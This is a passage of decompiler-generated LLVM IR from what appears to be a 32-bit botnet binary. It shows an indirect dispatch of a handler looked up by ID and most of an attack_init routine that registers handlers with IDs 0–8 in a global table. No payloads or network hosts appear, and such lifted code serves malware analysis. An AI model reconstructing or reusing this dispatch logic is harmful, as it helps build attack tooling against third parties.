  br i1 %v15_80484a3, label %dec_label_pc_80483cd, label %dec_label_pc_80484ad

dec_label_pc_80484ad:                             ; preds = %dec_label_pc_804849f
  %v9_80484af = icmp eq i32 %v5_80484a3, 1
  store i1 %v9_80484af, i1* %zf.global-to-local, align 1
  %v4_80484b2 = urem i32 %stack_var_-37.0.in, 256
  store i32 %v4_80484b2, i32* %eax.global-to-local, align 4
  %v1_80484b6 = load i32, i32* @ebx, align 4
  %v2_80484b6 = add i32 %v1_80484b6, %v4_80484b2
  store i32 %v2_80484b6, i32* %edx.global-to-local, align 4
  %v0_80484bd = load i32, i32* @edi, align 4
  %v2_80484bd = mul i32 %v1_8048523, 8
  %v3_80484bd = add i32 %v0_80484bd, %v2_80484bd
  store i32 %v1_8048523, i32* @ebx, align 4
  %v1_80484c8 = inttoptr i32 %v2_80484b6 to i8*
  %v2_80484c8 = load i8, i8* %v1_80484c8, align 1
  %v3_80484c8 = zext i8 %v2_80484c8 to i32
  store i32 %v3_80484c8, i32* %eax.global-to-local, align 4
  %v5_80484ca = or i32 %v2_80484bd, 4
  %v6_80484ca = add i32 %v5_80484ca, %v0_80484bd
  %v7_80484ca = inttoptr i32 %v6_80484ca to i8*
  store i8 %v2_80484c8, i8* %v7_80484ca, align 1
  %v0_80484ce = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80484ce, label %dec_label_pc_80483cd, label %dec_label_pc_80484d4

dec_label_pc_80484d4:                             ; preds = %dec_label_pc_80484ad
  %v0_80484d4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80484d4 = add i32 %v0_80484d4, 1
  %v2_80484d4 = inttoptr i32 %v1_80484d4 to i8*
  %v3_80484d4 = load i8, i8* %v2_80484d4, align 1
  %v4_80484d4 = zext i8 %v3_80484d4 to i32
  %v5_80484d4 = load i32, i32* %eax.global-to-local, align 4
  %v6_80484d4 = and i32 %v5_80484d4, -256
  %v7_80484d4 = or i32 %v6_80484d4, %v4_80484d4
  store i32 %v7_80484d4, i32* %eax.global-to-local, align 4
  %v0_80484d7 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80484d7 = add i32 %v0_80484d7, -2
  store i32 %v4_80484d4, i32* %ecx.global-to-local, align 4
  %v5_80484ee = sub i32 %v1_80484d7, %v4_80484d4
  %tmp61 = xor i32 %v5_80484ee, -2147483648
  %v13_80484ee = and i32 %tmp61, %v1_80484d7
  %v14_80484ee = icmp slt i32 %v13_80484ee, 0
  %v15_80484ee = icmp eq i32 %v5_80484ee, 0
  store i1 %v15_80484ee, i1* %zf.global-to-local, align 1
  %v16_80484ee = icmp slt i32 %v5_80484ee, 0
  %v2_80484f2 = icmp eq i1 %v16_80484ee, %v14_80484ee
  br i1 %v2_80484f2, label %dec_label_pc_80484f8, label %dec_label_pc_80483cd

dec_label_pc_80484f8:                             ; preds = %dec_label_pc_80484d4
  %v1_80484f8 = add i32 %v0_80484d4, 2
  store i32 %v1_80484f8, i32* @ebx, align 4
  br label %dec_label_pc_80484fb

dec_label_pc_80484fb:                             ; preds = %dec_label_pc_804848e, %dec_label_pc_80484f8
  %stack_var_-32.1 = phi i32 [ %v0_8048491, %dec_label_pc_804848e ], [ %v3_80484bd, %dec_label_pc_80484f8 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_804848e ], [ %v1_8048523, %dec_label_pc_80484f8 ]
  %stack_var_-48.0 = phi i32 [ %v4_8048469, %dec_label_pc_804848e ], [ %v4_80484d4, %dec_label_pc_80484f8 ]
  %stack_var_-24.0 = phi i32 [ %v1_8048472, %dec_label_pc_804848e ], [ %v1_80484d7, %dec_label_pc_80484f8 ]
  %stack_var_-37.0.in = phi i32 [ %v7_8048469, %dec_label_pc_804848e ], [ %v7_80484d4, %dec_label_pc_80484f8 ]
  %v1_8048503 = add nuw nsw i32 %stack_var_-48.0, 1
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 %v1_8048503, i32* %eax.global-to-local, align 4
  %v2_80485053 = zext i32 %v1_8048503 to i64
  %v3_8048505 = call i32 @calloc(i64 %v2_80485053, i32 1)
  store i32 %v3_8048505, i32* %eax.global-to-local, align 4
  %v0_804850e = load i32, i32* @esp, align 4
  %v9_804850e = icmp eq i32 %v0_804850e, -12
  store i1 %v9_804850e, i1* %zf.global-to-local, align 1
  %v2_8048511 = inttoptr i32 %stack_var_-32.1 to i32*
  store i32 %v3_8048505, i32* %v2_8048511, align 4
  store i32 %stack_var_-48.0, i32* %edx.global-to-local, align 4
  %v0_8048518 = load i32, i32* @ebx, align 4
  %v3_804851a = call i32 @util_memcpy(i32 %v3_8048505, i32 %v0_8048518, i32 %stack_var_-48.0)
  %v1_8048523 = add i32 %stack_var_-44.0, 1
  store i32 %v1_8048523, i32* %eax.global-to-local, align 4
  store i32 %v1_804842c, i32* %ecx.global-to-local, align 4
  %v15_804852f = icmp eq i32 %v1_8048523, %v1_804842c
  store i1 %v15_804852f, i1* %zf.global-to-local, align 1
  %v1_8048533 = icmp eq i1 %v15_804852f, false
  br i1 %v1_8048533, label %dec_label_pc_804849f, label %dec_label_pc_80483b5

dec_label_pc_804853e:                             ; preds = %dec_label_pc_80483b5
  %v1_804853e = add i32 %v1_80483c0, 1
  %v8_804853e = icmp eq i32 %v1_804853e, 0
  store i1 %v8_804853e, i1* %zf.global-to-local, align 1
  store i32 %v1_804853e, i32* %eax.global-to-local, align 4
  br i1 %v8_804853e, label %dec_label_pc_80483cd, label %dec_label_pc_8048545

dec_label_pc_8048545:                             ; preds = %dec_label_pc_804853e
  %v0_8048545 = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_8048545 = zext i8 %v0_8048545 to i32
  %v3_8048545 = and i32 %v1_804853e, -256
  %v4_8048545 = or i32 %v1_8048545, %v3_8048545
  store i32 %v4_8048545, i32* %eax.global-to-local, align 4
  %v4_8048552 = icmp eq i8 %v0_8048545, 0
  store i1 %v4_8048552, i1* %zf.global-to-local, align 1
  br i1 %v4_8048552, label %dec_label_pc_8048595, label %dec_label_pc_8048558

dec_label_pc_8048558:                             ; preds = %dec_label_pc_8048545
  %v0_8048558 = load i32, i32* @global_var_8057d20.11, align 32
  store i32 %v0_8048558, i32* %ecx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8048564 = inttoptr i32 %v0_8048558 to i32*
  %v2_8048564 = load i32, i32* %v1_8048564, align 4
  store i32 %v2_8048564, i32* %eax.global-to-local, align 4
  %v3_8048566 = add i32 %v2_8048564, 4
  %v4_8048566 = inttoptr i32 %v3_8048566 to i8*
  %v5_8048566 = load i8, i8* %v4_8048566, align 1
  %v16_8048566 = icmp eq i8 %v3_804831e, %v5_8048566
  store i1 %v16_8048566, i1* %zf.global-to-local, align 1
  br i1 %v16_8048566, label %dec_label_pc_804857c, label %dec_label_pc_804856b

dec_label_pc_804856b:                             ; preds = %dec_label_pc_8048558, %dec_label_pc_8048570
  %v5_8048573 = phi i32 [ %v7_8048573, %dec_label_pc_8048570 ], [ %v4_804831e, %dec_label_pc_8048558 ]
  %v0_804856b = phi i32 [ %v1_804856b, %dec_label_pc_8048570 ], [ 0, %dec_label_pc_8048558 ]
  %v1_804856b = add i32 %v0_804856b, 1
  store i32 %v1_804856b, i32* %edx.global-to-local, align 4
  %v12_804856c = icmp eq i32 %v1_804856b, %v1_8048545
  store i1 %v12_804856c, i1* %zf.global-to-local, align 1
  br i1 %v12_804856c, label %dec_label_pc_8048595, label %dec_label_pc_8048570

dec_label_pc_8048570:                             ; preds = %dec_label_pc_804856b
  %v2_8048570 = mul i32 %v1_804856b, 4
  %v3_8048570 = add i32 %v2_8048570, %v0_8048558
  %v4_8048570 = inttoptr i32 %v3_8048570 to i32*
  %v5_8048570 = load i32, i32* %v4_8048570, align 4
  store i32 %v5_8048570, i32* %eax.global-to-local, align 4
  %v6_8048573 = and i32 %v5_8048573, -256
  %v7_8048573 = or i32 %v6_8048573, %v4_804831e
  %v3_8048577 = add i32 %v5_8048570, 4
  %v4_8048577 = inttoptr i32 %v3_8048577 to i8*
  %v5_8048577 = load i8, i8* %v4_8048577, align 1
  %v16_8048577 = icmp eq i8 %v3_804831e, %v5_8048577
  store i1 %v16_8048577, i1* %zf.global-to-local, align 1
  %v1_804857a = icmp eq i1 %v16_8048577, false
  br i1 %v1_804857a, label %dec_label_pc_804856b, label %dec_label_pc_804857c

dec_label_pc_804857c:                             ; preds = %dec_label_pc_8048570, %dec_label_pc_8048558
  %v4_8048590 = phi i32 [ %v2_8048564, %dec_label_pc_8048558 ], [ %v5_8048570, %dec_label_pc_8048570 ]
  %v0_804857c = load i32, i32* @esp, align 4
  %v9_804857c = icmp eq i32 %v0_804857c, 12
  store i1 %v9_804857c, i1* %zf.global-to-local, align 1
  store i32 %v3_8048355, i32* %ecx.global-to-local, align 4
  store i32 %v4_804832a, i32* %edx.global-to-local, align 4
  %v5_8048590 = inttoptr i32 %v4_8048590 to i32*
  %v6_8048590 = load i32, i32* %v5_8048590, align 4
  call void @__pseudo_call(i32 %v6_8048590)
  %v0_8048592 = load i32, i32* @esp, align 4
  %v6_8048592 = icmp eq i32 %v0_8048592, -32
  store i1 %v6_8048592, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048595

dec_label_pc_8048595:                             ; preds = %dec_label_pc_804856b, %dec_label_pc_8048545, %dec_label_pc_804857c
  %v0_8048595 = load i32, i32* @esp, align 4
  %v9_8048595 = icmp eq i32 %v0_8048595, 12
  store i1 %v9_8048595, i1* %zf.global-to-local, align 1
  %v1_804859a = call i32 @__GI_exit(i32 0)
  store i32 %v1_804859a, i32* %eax.global-to-local, align 4
  ret i32 %v1_804859a

; uselistorder directives
  uselistorder i1 %v16_8048577, { 1, 0 }
  uselistorder i1 %v12_804856c, { 1, 0 }
  uselistorder i32 %v1_804856b, { 2, 0, 3, 1 }
  uselistorder i1 %v16_8048566, { 1, 0 }
  uselistorder i32 %v1_8048545, { 1, 0 }
  uselistorder i1 %v15_804852f, { 1, 0 }
  uselistorder i32 %v1_8048523, { 0, 4, 3, 2, 1 }
  uselistorder i32 %stack_var_-48.0, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %v5_80484ee, { 1, 2, 0 }
  uselistorder i32 %v1_80484d7, { 1, 0, 2 }
  uselistorder i32 %v4_80484d4, { 3, 2, 1, 0 }
  uselistorder i32 %v4_80484b2, { 1, 0 }
  uselistorder i32 %v2_8048486, { 1, 2, 0 }
  uselistorder i32 %v1_8048472, { 2, 0, 1, 3 }
  uselistorder i32 %v4_8048469, { 3, 1, 2, 0 }
  uselistorder i1 %v12_804845e, { 1, 0 }
  uselistorder i32 %v1_804842c, { 4, 2, 3, 1, 0, 5 }
  uselistorder i32 %stack_var_-20.2, { 8, 7, 6, 3, 5, 4, 2, 1, 0 }
  uselistorder i1 %v12_8048415, { 1, 0 }
  uselistorder i32 %v1_8048414, { 0, 2, 1 }
  uselistorder i32 %v1_80483f3, { 2, 1, 0 }
  uselistorder i32 %v1_80483c0, { 1, 0, 2, 3 }
  uselistorder i1 %v9_804837f.le, { 1, 0 }
  uselistorder i1 %v12_8048389, { 1, 0 }
  uselistorder i32 %v1_8048382, { 1, 0 }
  uselistorder i32 %v1_804837f, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804837f, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804835a, { 1, 0 }
  uselistorder i32 %v3_8048355, { 4, 5, 6, 2, 3, 0, 1, 7 }
  uselistorder i32 %v1_8048337, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_804832a, { 3, 2, 1, 4, 0 }
  uselistorder i1 %v9_8048321, { 1, 0 }
  uselistorder i32 %v4_804831e, { 1, 0, 2 }
  uselistorder i1 %v9_8048319, { 1, 0 }
  uselistorder i32 %v0_80482f3, { 1, 0 }
  uselistorder i32 %v0_80482f2, { 1, 0 }
  uselistorder i32 %v0_80482f0, { 1, 0 }
  uselistorder i32 %tmp41, { 5, 0, 1, 3, 4, 6, 2, 7 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 13, 14, 15, 9, 10, 11, 12, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 5, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 10, 11, 12, 6, 7, 8, 9, 13, 14, 15, 0, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder label %dec_label_pc_8048595, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804856b, { 1, 0 }
  uselistorder label %dec_label_pc_80484fb, { 1, 0 }
  uselistorder label %dec_label_pc_8048429, { 1, 0 }
  uselistorder label %dec_label_pc_8048414, { 1, 0 }
  uselistorder label %dec_label_pc_80483e5, { 1, 0 }
  uselistorder label %dec_label_pc_80483cd, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
}

define i32 @attack_init() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80485a0 = load i32, i32* @ebx, align 4
  store i32 %v0_80485a0, i32* %stack_var_-4, align 4
  %v3_80485a8 = call i32 @calloc(i64 1, i32 8)
  store i32 %v3_80485a8, i32* @ebx, align 4
  %v1_80485af = add i32 %v3_80485a8, 4
  %v2_80485af = inttoptr i32 %v1_80485af to i8*
  store i8 0, i8* %v2_80485af, align 1
  %v1_80485b3 = inttoptr i32 %v3_80485a8 to i32*
  store i32 134530672, i32* %v1_80485b3, align 4
  %v0_80485bc = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_80485bc = zext i8 %v0_80485bc to i32
  store i32 8, i32* @edx, align 4
  %v1_80485c2 = mul nuw nsw i32 %v1_80485bc, 4
  %v2_80485c2 = add nuw nsw i32 %v1_80485c2, 4
  %v0_80485ca = load i32, i32* @global_var_8057d20.11, align 32
  %v2_80485d0 = inttoptr i32 %v0_80485ca to i32*
  %v3_80485d0 = call i32 @realloc(i32* %v2_80485d0, i32 %v2_80485c2)
  %v0_80485d5 = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_80485d5 = zext i8 %v0_80485d5 to i32
  %v2_80485d5 = load i32, i32* @edx, align 4
  %v3_80485d5 = and i32 %v2_80485d5, -256
  %v4_80485d5 = or i32 %v3_80485d5, %v1_80485d5
  %v1_80485df = add i32 %v4_80485d5, 1
  store i32 %v1_80485df, i32* %edx.global-to-local, align 4
  store i32 %v3_80485d0, i32* @global_var_8057d20.11, align 32
  %v0_80485e5 = load i32, i32* @ebx, align 4
  %v3_80485e5 = mul nuw nsw i32 %v1_80485d5, 4
  %v4_80485e5 = add i32 %v3_80485e5, %v3_80485d0
  %v5_80485e5 = inttoptr i32 %v4_80485e5 to i32*
  store i32 %v0_80485e5, i32* %v5_80485e5, align 4
  %v0_80485e8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80485e8 = trunc i32 %v0_80485e8 to i8
  store i8 %v1_80485e8, i8* @global_var_8057d1c.10, align 4
  store i32 %v2_80485c2, i32* @ebx, align 4
  %v3_80485f4 = call i32 @calloc(i64 1, i32 8)
  store i32 %v3_80485f4, i32* @ebx, align 4
  %v1_80485fb = add i32 %v3_80485f4, 4
  %v2_80485fb = inttoptr i32 %v1_80485fb to i8*
  store i8 1, i8* %v2_80485fb, align 1
  %v1_80485ff = inttoptr i32 %v3_80485f4 to i32*
  store i32 134531920, i32* %v1_80485ff, align 4
  %v0_8048608 = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_8048608 = zext i8 %v0_8048608 to i32
  store i32 8, i32* @edx, align 4
  %v1_804860e = mul nuw nsw i32 %v1_8048608, 4
  %v2_804860e = add nuw nsw i32 %v1_804860e, 4
  %v0_8048616 = load i32, i32* @global_var_8057d20.11, align 32
  %v2_804861c = inttoptr i32 %v0_8048616 to i32*
  %v3_804861c = call i32 @realloc(i32* %v2_804861c, i32 %v2_804860e)
  %v0_8048621 = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_8048621 = zext i8 %v0_8048621 to i32
  %v2_8048621 = load i32, i32* @edx, align 4
  %v3_8048621 = and i32 %v2_8048621, -256
  %v4_8048621 = or i32 %v3_8048621, %v1_8048621
  %v1_804862b = add i32 %v4_8048621, 1
  store i32 %v1_804862b, i32* %edx.global-to-local, align 4
  store i32 %v3_804861c, i32* @global_var_8057d20.11, align 32
  %v0_8048631 = load i32, i32* @ebx, align 4
  %v3_8048631 = mul nuw nsw i32 %v1_8048621, 4
  %v4_8048631 = add i32 %v3_8048631, %v3_804861c
  %v5_8048631 = inttoptr i32 %v4_8048631 to i32*
  store i32 %v0_8048631, i32* %v5_8048631, align 4
  %v0_8048634 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048634 = trunc i32 %v0_8048634 to i8
  store i8 %v1_8048634, i8* @global_var_8057d1c.10, align 4
  store i32 %v2_804860e, i32* @ebx, align 4
  %v3_8048640 = call i32 @calloc(i64 1, i32 8)
  store i32 %v3_8048640, i32* @ebx, align 4
  %v1_8048647 = add i32 %v3_8048640, 4
  %v2_8048647 = inttoptr i32 %v1_8048647 to i8*
  store i8 2, i8* %v2_8048647, align 1
  %v1_804864b = inttoptr i32 %v3_8048640 to i32*
  store i32 134532864, i32* %v1_804864b, align 4
  %v0_8048654 = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_8048654 = zext i8 %v0_8048654 to i32
  store i32 8, i32* @edx, align 4
  %v1_804865a = mul nuw nsw i32 %v1_8048654, 4
  %v2_804865a = add nuw nsw i32 %v1_804865a, 4
  %v0_8048662 = load i32, i32* @global_var_8057d20.11, align 32
  %v2_8048668 = inttoptr i32 %v0_8048662 to i32*
  %v3_8048668 = call i32 @realloc(i32* %v2_8048668, i32 %v2_804865a)
  %v0_804866d = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_804866d = zext i8 %v0_804866d to i32
  %v2_804866d = load i32, i32* @edx, align 4
  %v3_804866d = and i32 %v2_804866d, -256
  %v4_804866d = or i32 %v3_804866d, %v1_804866d
  %v1_8048677 = add i32 %v4_804866d, 1
  store i32 %v1_8048677, i32* %edx.global-to-local, align 4
  store i32 %v3_8048668, i32* @global_var_8057d20.11, align 32
  %v0_804867d = load i32, i32* @ebx, align 4
  %v3_804867d = mul nuw nsw i32 %v1_804866d, 4
  %v4_804867d = add i32 %v3_804867d, %v3_8048668
  %v5_804867d = inttoptr i32 %v4_804867d to i32*
  store i32 %v0_804867d, i32* %v5_804867d, align 4
  %v0_8048680 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048680 = trunc i32 %v0_8048680 to i8
  store i8 %v1_8048680, i8* @global_var_8057d1c.10, align 4
  store i32 %v2_804865a, i32* @ebx, align 4
  %v3_804868c = call i32 @calloc(i64 1, i32 8)
  store i32 %v3_804868c, i32* @ebx, align 4
  %v1_8048693 = add i32 %v3_804868c, 4
  %v2_8048693 = inttoptr i32 %v1_8048693 to i8*
  store i8 8, i8* %v2_8048693, align 1
  %v1_8048697 = inttoptr i32 %v3_804868c to i32*
  store i32 134530032, i32* %v1_8048697, align 4
  %v0_80486a0 = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_80486a0 = zext i8 %v0_80486a0 to i32
  store i32 8, i32* @edx, align 4
  %v1_80486a6 = mul nuw nsw i32 %v1_80486a0, 4
  %v2_80486a6 = add nuw nsw i32 %v1_80486a6, 4
  %v0_80486ae = load i32, i32* @global_var_8057d20.11, align 32
  %v2_80486b4 = inttoptr i32 %v0_80486ae to i32*
  %v3_80486b4 = call i32 @realloc(i32* %v2_80486b4, i32 %v2_80486a6)
  %v0_80486b9 = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_80486b9 = zext i8 %v0_80486b9 to i32
  %v2_80486b9 = load i32, i32* @edx, align 4
  %v3_80486b9 = and i32 %v2_80486b9, -256
  %v4_80486b9 = or i32 %v3_80486b9, %v1_80486b9
  %v1_80486c3 = add i32 %v4_80486b9, 1
  store i32 %v1_80486c3, i32* %edx.global-to-local, align 4
  store i32 %v3_80486b4, i32* @global_var_8057d20.11, align 32
  %v0_80486c9 = load i32, i32* @ebx, align 4
  %v3_80486c9 = mul nuw nsw i32 %v1_80486b9, 4
  %v4_80486c9 = add i32 %v3_80486c9, %v3_80486b4
  %v5_80486c9 = inttoptr i32 %v4_80486c9 to i32*
  store i32 %v0_80486c9, i32* %v5_80486c9, align 4
  %v0_80486cc = load i32, i32* %edx.global-to-local, align 4
  %v1_80486cc = trunc i32 %v0_80486cc to i8
  store i8 %v1_80486cc, i8* @global_var_8057d1c.10, align 4
  store i32 %v2_80486a6, i32* @ebx, align 4
  %v3_80486d8 = call i32 @calloc(i64 1, i32 8)
  store i32 %v3_80486d8, i32* @ebx, align 4
  %v1_80486df = add i32 %v3_80486d8, 4
  %v2_80486df = inttoptr i32 %v1_80486df to i8*
  store i8 3, i8* %v2_80486df, align 1
  %v1_80486e3 = inttoptr i32 %v3_80486d8 to i32*
  store i32 134528608, i32* %v1_80486e3, align 4
  %v0_80486ec = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_80486ec = zext i8 %v0_80486ec to i32
  store i32 8, i32* @edx, align 4
  %v1_80486f2 = mul nuw nsw i32 %v1_80486ec, 4
  %v2_80486f2 = add nuw nsw i32 %v1_80486f2, 4
  %v0_80486fa = load i32, i32* @global_var_8057d20.11, align 32
  %v2_8048700 = inttoptr i32 %v0_80486fa to i32*
  %v3_8048700 = call i32 @realloc(i32* %v2_8048700, i32 %v2_80486f2)
  %v0_8048705 = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_8048705 = zext i8 %v0_8048705 to i32
  %v2_8048705 = load i32, i32* @edx, align 4
  %v3_8048705 = and i32 %v2_8048705, -256
  %v4_8048705 = or i32 %v3_8048705, %v1_8048705
  %v1_804870f = add i32 %v4_8048705, 1
  store i32 %v1_804870f, i32* %edx.global-to-local, align 4
  store i32 %v3_8048700, i32* @global_var_8057d20.11, align 32
  %v0_8048715 = load i32, i32* @ebx, align 4
  %v3_8048715 = mul nuw nsw i32 %v1_8048705, 4
  %v4_8048715 = add i32 %v3_8048715, %v3_8048700
  %v5_8048715 = inttoptr i32 %v4_8048715 to i32*
  store i32 %v0_8048715, i32* %v5_8048715, align 4
  %v0_8048718 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048718 = trunc i32 %v0_8048718 to i8
  store i8 %v1_8048718, i8* @global_var_8057d1c.10, align 4
  store i32 %v2_80486f2, i32* @ebx, align 4
  %v3_8048724 = call i32 @calloc(i64 1, i32 8)
  store i32 %v3_8048724, i32* @ebx, align 4
  %v1_804872b = add i32 %v3_8048724, 4
  %v2_804872b = inttoptr i32 %v1_804872b to i8*
  store i8 4, i8* %v2_804872b, align 1
  %v1_804872f = inttoptr i32 %v3_8048724 to i32*
  store i32 134527072, i32* %v1_804872f, align 4
  %v0_8048738 = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_8048738 = zext i8 %v0_8048738 to i32
  store i32 8, i32* @edx, align 4
  %v1_804873e = mul nuw nsw i32 %v1_8048738, 4
  %v2_804873e = add nuw nsw i32 %v1_804873e, 4
  %v0_8048746 = load i32, i32* @global_var_8057d20.11, align 32
  %v2_804874c = inttoptr i32 %v0_8048746 to i32*
  %v3_804874c = call i32 @realloc(i32* %v2_804874c, i32 %v2_804873e)
  %v0_8048751 = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_8048751 = zext i8 %v0_8048751 to i32
  %v2_8048751 = load i32, i32* @edx, align 4
  %v3_8048751 = and i32 %v2_8048751, -256
  %v4_8048751 = or i32 %v3_8048751, %v1_8048751
  %v1_804875b = add i32 %v4_8048751, 1
  store i32 %v1_804875b, i32* %edx.global-to-local, align 4
  store i32 %v3_804874c, i32* @global_var_8057d20.11, align 32
  %v0_8048761 = load i32, i32* @ebx, align 4
  %v3_8048761 = mul nuw nsw i32 %v1_8048751, 4
  %v4_8048761 = add i32 %v3_8048761, %v3_804874c
  %v5_8048761 = inttoptr i32 %v4_8048761 to i32*
  store i32 %v0_8048761, i32* %v5_8048761, align 4
  %v0_8048764 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048764 = trunc i32 %v0_8048764 to i8
  store i8 %v1_8048764, i8* @global_var_8057d1c.10, align 4
  store i32 %v2_804873e, i32* @ebx, align 4
  %v3_8048770 = call i32 @calloc(i64 1, i32 8)
  store i32 %v3_8048770, i32* @ebx, align 4
  %v1_8048777 = add i32 %v3_8048770, 4
  %v2_8048777 = inttoptr i32 %v1_8048777 to i8*
  store i8 5, i8* %v2_8048777, align 1
  %v1_804877b = inttoptr i32 %v3_8048770 to i32*
  store i32 134525312, i32* %v1_804877b, align 4
  %v0_8048784 = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_8048784 = zext i8 %v0_8048784 to i32
  store i32 8, i32* @edx, align 4
  %v1_804878a = mul nuw nsw i32 %v1_8048784, 4
  %v2_804878a = add nuw nsw i32 %v1_804878a, 4
  %v0_8048792 = load i32, i32* @global_var_8057d20.11, align 32
  %v2_8048798 = inttoptr i32 %v0_8048792 to i32*
  %v3_8048798 = call i32 @realloc(i32* %v2_8048798, i32 %v2_804878a)
  %v0_804879d = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_804879d = zext i8 %v0_804879d to i32
  %v2_804879d = load i32, i32* @edx, align 4
  %v3_804879d = and i32 %v2_804879d, -256
  %v4_804879d = or i32 %v3_804879d, %v1_804879d
  %v1_80487a7 = add i32 %v4_804879d, 1
  store i32 %v1_80487a7, i32* %edx.global-to-local, align 4
  store i32 %v3_8048798, i32* @global_var_8057d20.11, align 32
  %v0_80487ad = load i32, i32* @ebx, align 4
  %v3_80487ad = mul nuw nsw i32 %v1_804879d, 4
  %v4_80487ad = add i32 %v3_80487ad, %v3_8048798
  %v5_80487ad = inttoptr i32 %v4_80487ad to i32*
  store i32 %v0_80487ad, i32* %v5_80487ad, align 4
  %v0_80487b0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80487b0 = trunc i32 %v0_80487b0 to i8
  store i8 %v1_80487b0, i8* @global_var_8057d1c.10, align 4
  store i32 %v2_804878a, i32* @ebx, align 4
  %v3_80487bc = call i32 @calloc(i64 1, i32 8)
  store i32 %v3_80487bc, i32* @ebx, align 4
  %v1_80487c3 = add i32 %v3_80487bc, 4
  %v2_80487c3 = inttoptr i32 %v1_80487c3 to i8*
  store i8 6, i8* %v2_80487c3, align 1
  %v1_80487c7 = inttoptr i32 %v3_80487bc to i32*
  store i32 134524000, i32* %v1_80487c7, align 4
  %v0_80487d0 = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_80487d0 = zext i8 %v0_80487d0 to i32
  store i32 8, i32* @edx, align 4
  %v1_80487d6 = mul nuw nsw i32 %v1_80487d0, 4
  %v2_80487d6 = add nuw nsw i32 %v1_80487d6, 4
  %v0_80487de = load i32, i32* @global_var_8057d20.11, align 32
  %v2_80487e4 = inttoptr i32 %v0_80487de to i32*
  %v3_80487e4 = call i32 @realloc(i32* %v2_80487e4, i32 %v2_80487d6)
  %v0_80487e9 = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_80487e9 = zext i8 %v0_80487e9 to i32
  %v2_80487e9 = load i32, i32* @edx, align 4
  %v3_80487e9 = and i32 %v2_80487e9, -256
  %v4_80487e9 = or i32 %v3_80487e9, %v1_80487e9
  %v1_80487f3 = add i32 %v4_80487e9, 1
  store i32 %v1_80487f3, i32* %edx.global-to-local, align 4
  store i32 %v3_80487e4, i32* @global_var_8057d20.11, align 32
  %v0_80487f9 = load i32, i32* @ebx, align 4
  %v3_80487f9 = mul nuw nsw i32 %v1_80487e9, 4
  %v4_80487f9 = add i32 %v3_80487f9, %v3_80487e4
  %v5_80487f9 = inttoptr i32 %v4_80487f9 to i32*
  store i32 %v0_80487f9, i32* %v5_80487f9, align 4
  %v0_80487fc = load i32, i32* %edx.global-to-local, align 4
  %v1_80487fc = trunc i32 %v0_80487fc to i8
  store i8 %v1_80487fc, i8* @global_var_8057d1c.10, align 4
  store i32 %v2_80487d6, i32* @ebx, align 4
  %v3_8048808 = call i32 @calloc(i64 1, i32 8)
  store i32 %v3_8048808, i32* @ebx, align 4
  %v1_804880f = add i32 %v3_8048808, 4
  %v2_804880f = inttoptr i32 %v1_804880f to i8*
  store i8 7, i8* %v2_804880f, align 1
  %v1_8048813 = inttoptr i32 %v3_8048808 to i32*
  store i32 134522528, i32* %v1_8048813, align 4
  %v0_804881c = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_804881c = zext i8 %v0_804881c to i32
  store i32 8, i32* @edx, align 4
  %v0_8048822 = load i32, i32* @global_var_8057d20.11, align 32
  %v1_8048828 = mul nuw nsw i32 %v1_804881c, 4
  %v2_8048828 = add nuw nsw i32 %v1_8048828, 4
  %v2_8048831 = inttoptr i32 %v0_8048822 to i32*
  %v3_8048831 = call i32 @realloc(i32* %v2_8048831, i32 %v2_8048828)
  %v0_8048836 = load i8, i8* @global_var_8057d1c.10, align 4
  %v1_8048836 = zext i8 %v0_8048836 to i32
  %v2_8048836 = load i32, i32* @edx, align 4
  %v3_8048836 = and i32 %v2_8048836, -256
  %v4_8048836 = or i32 %v3_8048836, %v1_8048836
  store i32 %v3_8048831, i32* @global_var_8057d20.11, align 32
  %v1_8048845 = add i32 %v4_8048836, 1
